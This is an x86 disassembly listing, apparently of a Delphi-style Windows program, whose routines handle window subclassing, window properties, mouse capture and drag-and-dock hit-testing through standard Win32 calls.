push es
dec ebp
popad
sub_43edf6
inc esp
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
js r-xdata
fdiv [ edx ]
inc esp
add [ esp + eax + 0x82c0045 ] ah
inc ebp
add ah ah
add eax [ ebp ]
add [ edx - 0x5f33ffbf ] ah
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add al bl
cmc
inc esp
add al bl
inc [ eax + eax + 0x38 ]
cmpsd [ esi ] [ edi ]
inc esp
add al ah
or al 0x45
add [ ebp + ecx + 0x45 ] ch
add [ eax + ebp * 4 + 0x44 ] bh
add [ esi ] cl
push esp
inc esp
jb r-xdata
inc ebx
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x43ee7090
add [ edi ] al
push cs
push esp
inc esp
jb r-xdata
inc eax
add al bh
fdiv [ edx ]
inc esp
add [ esp + eax + 0x82c0045 ] ah
inc ebp
add ah ah
add eax [ ebp ]
add [ edx - 0x5f33ffbf ] ah
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
movsd [ edi ] [ esi ]
xor al [ eax ]
js r-xdata
add ah bl
xor al [ eax ]
clc
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
insb
cmc
inc esp
add [ edx ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc eax
add [ eax ] al
dec esp
add eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax + 0x2 ] al
add eax 0x72440c00
popad
ja r-xdata
outsd
insb
jae r-xdata
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add al bl
cmc
inc esp
add al bl
inc [ eax + eax + 0x38 ]
cmpsd [ esi ] [ edi ]
inc esp
add al ah
or al 0x45
add [ ebp + ecx + 0x45 ] ch
add [ eax + ebp * 4 + 0x44 ] bh
add [ edx ] cl
push esp
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x43ef3890
add [ edi ] al
or dl [ ecx + ecx * 2 + 0x6d ]
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
insb
out dx al
inc ebx
add [ eax + eax ] cl
or [ ebx + 0x6f ] al
outsb
je r-xdata
outsd
insb
jae r-xdata
jae r-xdata
outsb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
[ edi ]
add al [ eax ]
or al [ edx + 0x6c ]
outsb
inc ebx
outsd
insb
outsd
jb r-xdata
add [ esp + esi * 4 + 0x41 ] ah
add [ eax ] cl
add bh bh
dec eax
add [ ebp - 0x111bffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
out dx eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
out dx eax
inc ebx
add [ eax - 0x34000000 ] al
in eax dx
add al 0xf1
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 8 ] al
sub al 0x1a
inc ecx
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080009 ] al
outsb
inc ebx
push 0x65676e61
add [ eax ] dl
inc eax
add [ edx ] al
add bh bh
inc edx
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or edx [ ebx + 0x68 ]
popad
jb r-xdata
insb
push esp
adc [ eax ] al
xor [ eax ] al
add bh bh
push ebx
je r-xdata
mov ah 0x41
add [ eax + 0x780044ff ] dh
inc [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
[ edi ]
add eax [ eax ]
pop es
inc edx
imul eax [ ebx + 0x6f ] 0x6c
outsd
jb r-xdata
add ah bl
xor al [ eax ]
clc
dec ecx
insd
popad
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x10 ] al
push es
add [ esi ] al
dec eax
imul esp [ gs : edi + 0x68 ] 0x44f47074
add [ ebx ] al
add bh bh
inc ebx
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ ecx ] cl
dec ecx
insd
popad
push esp
jns r-xdata
adc [ eax ] al
cmp [ eax ] al
add bh bh
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
add al 0x0
pop es
inc ecx
insb
insb
outsd
arpl [ edx + 0x79 ] ax
sbb al 0xf4
inc esp
add [ eax ] al
add bh bh
int3
xor al [ eax ]
xor al 0x33
inc eax
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
xor eax 0x35a00040
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
inc ebx
add [ eax ] ch
add [ eax ] al
add al cl
adc [ eax ] al
adc [ eax ] al
xor al 0x0
add bh bh
lodsb [ esi ]
clc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x74646957
push r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xf1
add [ eax ] al
[ eax + edi * 8 + 0x10044 ]
add [ gs : eax ] dl
inc eax
add [ ecx ] al
add bh bh
inc ecx
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] al
push es
dec ebp
popad
sub_43f0e5
xor eax 0x35980040
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_43f2f0
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_43f3a8
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_43f3dc
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404554
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_43f3a8
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_43f438
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_43f61c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c998
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_4045b4
mov eax edi
mov edx esi
call sub_4040e8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43f660
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c998
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_4045b4
mov eax edi
mov edx esi
call sub_4040e8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43f6a4
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
add eax [ esi + 0x44 ]
push eax
mov eax [ esp + 0x8 ]
add eax [ esi + 0x40 ]
push eax
push ebx
call SetWindowOrgEx
mov eax ebx
push eax
mov ecx eax
mov edx 0x14
mov eax [ esi + 0x30 ]
call sub_443750
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43f720
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
jne r-xdata
mov eax ebx
call sub_448d84
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_43f7cc
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_4143bc
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_43f800
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_448d84
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_43f828
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026f4
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_43f800
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_43f7cc
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_414210
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_414438
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43f884
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_414244
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4143bc
mov edx 0x8
call sub_402714
inc esi
dec ebx
jne r-xdata
sub_43f8b8
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_4143bc
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_43f7cc
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_43f91c
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_43f97c
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_403294
mov edx esp
mov eax esi
call sub_4042f8
add esp 0x100
pop esi
pop ebx
retn
sub_43f9b8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43fa82
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_440ad8
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_440460
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406c90
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_440460
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_440ad8
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_440460
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_440ad8
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_43fa87
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46321c
call sub_403b4c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_440ad8
sub_43fae0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43fb0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43fb70
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f91c
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_43fb9c
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_403540
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_43fbc8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_403540
xor edx edx
sub_43fc20
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_44a9ec
sub_43fc40
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_44a9d4
sub_43fc64
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43fb4c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d818
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_4246e4
mov edx eax
mov eax esi
call sub_41d99c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_43fcc8
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_43fcf8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43fb70
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_43fd54
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_403540
pop edi
pop esi
pop ebp
retn 0x4
sub_43fd78
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_43fd9c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_43fd78
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_43fd78
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_43fe58
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_43fec4
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_440314
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_43f3dc
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_448d84
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_448d84
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_448d84
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_403540
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_43fe58
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_448d84
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_448d84
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_44005c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_448d84
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_448d84
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_4400a0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_43f8b8
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_43fec4
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4143bc
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_448d84
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_44005c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_403540
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4478b4
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_43f828
sub_4401fc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_414418
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_41425c
mov edx edi
mov eax [ rw-data ]
call sub_414210
jmp r-xdata
sub_44025c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
